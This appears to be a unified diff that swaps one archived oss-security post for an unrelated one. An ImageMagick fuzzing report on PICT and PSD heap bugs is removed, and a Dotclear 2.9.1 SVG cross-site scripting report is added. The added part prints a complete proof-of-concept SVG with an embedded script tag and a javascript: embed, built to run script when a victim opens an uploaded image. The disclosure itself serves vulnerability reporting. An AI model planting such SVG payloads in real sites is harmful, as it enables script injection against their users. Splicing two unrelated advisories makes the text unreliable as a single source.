@@ -1,61 +1,57 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/11/3
-Message-ID: <20160511120119.056ad3c2@pc1>
-Date: Wed, 11 May 2016 12:01:19 +0200
-From: Hanno Böck <hanno@...eck.de>
-To: oss-security@...ts.openwall.com
-Cc: cve-assign@...re.org
-Subject: ImageMagick heap overflow and out of bounds read
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2016/05/04/9
+Message-ID: <3626D6E697A150459C44C0E5D8D8D00E0DBDC360@EX02.corp.qihoo.net>
+Date: Wed, 4 May 2016 06:46:11 +0000
+From: limingxing <limingxing@....cn>
+To: "oss-security@...ts.openwall.com" <oss-security@...ts.openwall.com>
+Subject: Dotclear 2.9.1 XSS vulnerability by SVG
 Content-Type: text/plain; charset=utf-8
 
-https://blog.fuzzing-project.org/45-ImageMagick-heap-overflow-and-out-of-bounds-read.html
 
-Recently the ImageTragick vulnerability shed some light on the security
-status of ImageMagick.
+Hello,
+We find an vulnerability about Dotclear 2.9.1 XSS vulnerability by SVG
 
-This made me wonder how resilient to fuzzing ImageMagick is these days.
-It's pretty much a posterchild example for a good fuzzing target: Lots
-of supported complex binary file formats.
+inc/core/class.dc.core.php
+array('media_exclusion','string','/\.(phps?|pht(ml)?|phl)[0-9]*$/i',
 
-I already did some fuzzing on ImageMagick, but as far as I remember
-that was before I used american fuzzy lop and was done with zzuf. I was
-also aware that others did some more thorough fuzzing on ImageMagick.
-http://www.openwall.com/lists/oss-security/2014/12/24/1
+Attackers can upload a special SVG picture, for example, add the origin SVG picture with
+<script>alert(location)</script>
+<foreignObject width="100" height="50"
+requiredExtensions="http://www.w3.org/1999/xhtml">
+ <embed xmlns="http://www.w3.org/1999/xhtml"
+src="javascript:alert(location)" />
+ </foreignObject>
+After upload the special SVG, attackers can publish an article with this picture with the herf link to this picture. If someone click the picture, it will jump to the url of the picture, and this will cause XSS.
+Test on Firefox 45.0.2 （20160407164938）with two alerts.
+Test on Chrome 50.0.2661.94m and IE 10.0.10240.16766 with only one alert (<script>alert (location)</script>)
+ 
+ 
+The picture used for test is
+ 
+<?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 18.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">
+<svg version="1.1" id="Capa_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+         viewBox="0 0 22 20" style="enable-background:new 0 0 22 20;" xml:space="preserve">
+<g>
+         <path style="fill-rule:evenodd;clip-rule:evenodd;" d="M0,10.014c0,1.985,1.486,3.632,3.438,3.95l0.688,0.055h3.832v-1.993H4.173
+                  L3.717,11.99C2.399,11.78,2,10.982,1.943,9.939C1.888,8.942,2.831,8.053,4.475,7.486c0,0-1.214-1.617,0-2.633
+                  c1.214-1.016,2.967,0.884,2.967,0.884s2.197-4.176,5.463-3.87c4.929,0.463,4.541,5.917,4.541,5.917s2.566,0.439,2.566,2.155
+                  c0,1.915-2.185,2.087-2.185,2.087h-3.758v1.993h3.806l0.688-0.055C20.514,13.646,22,11.999,22,10.014
+                  c0-1.744-1.148-3.229-2.751-3.778C19.191,2.782,16.289,0,12.719,0c-2.575,0-4.802,1.447-5.866,3.55
+                  C6.35,3.01,5.622,2.67,4.812,2.67c-1.519,0-2.75,1.196-2.75,2.67c0,0.385,0.084,0.751,0.234,1.081C0.936,7.076,0,8.439,0,10.014z"
+                  />
+         <polygon style="fill-rule:evenodd;clip-rule:evenodd;" points="12,20 12,8.581 16,11 16,9 11,6 6,9 6,11 10,8.581 10,20        "/>
+</g>
+<script>alert(location)</script>
+<foreignObject width="100" height="50"
+requiredExtensions="http://www.w3.org/1999/xhtml">
+ 
+<embed xmlns="http://www.w3.org/1999/xhtml"
+src="javascript:alert(location)" />
+ 
+</foreignObject>
+ 
+</svg>
 
-What I did now was relatively simple: I took a trivial, few pixels PNG
-and used ImageMagick's "convert" tool to convert it into all file
-formats that have both read and write support in ImageMagick. I used
-that to run a fuzzing job with afl and asan. By design ImageMagick will
-sometimes do huge memory allocations, these can be prevented by setting
-limits for the width, height and memory usage in the policy.xml file.
-
-I discovered one heap buffer overflow in the PICT parser and one heap
-out of bounds read in the PSD parser. Given how big the attack surface
-is this is not terrible, but it shows that despite previous efforts
-there's still potential to fuzz ImageMagick.
-
-https://crashes.fuzzing-project.org/imagemagick-heapoverflow-WritePixelCachePixels.pict
-Sample file for heap buffer overflow in WritePixelCachePixels() (PICT
-format)
-https://github.com/ImageMagick/ImageMagick/commit/cfbe890d0cfcd5d3b0f63744a6901e40e992e07c
-Git commit / fix
-
-https://crashes.fuzzing-project.org/imagemagick-oob-heap-read-PushShortPixel.psd
-Sample file for heap out of bounds read in PushShortPixel() (PSD format)
-https://github.com/ImageMagick/ImageMagick/commit/15dd190dfd7e7a3341bdc378f4f0daba9873322c
-Git commit / fix
-
-https://www.imagemagick.org/script/changelog.php
-Both issues have been fixed in the versions 6.9.4-0 and 7.0.1-2. In the
-meantime new versions (6.9.4-1, 7.0.1-3) came out that, as far as I
-understand the ChangeLog, remove another potential vector for the
-ImageTragick vulnerabilities, so you should preferrably update to those.
-
--- 
-Hanno Böck
-https://hboeck.de/
-
-mail/jabber: hanno@...eck.de
-GPG: BBB51E42
-
-Content of type "application/pgp-signature" skipped
+This vulnerability was found by chenruiqi of Qihoo 360 Codesafe Team
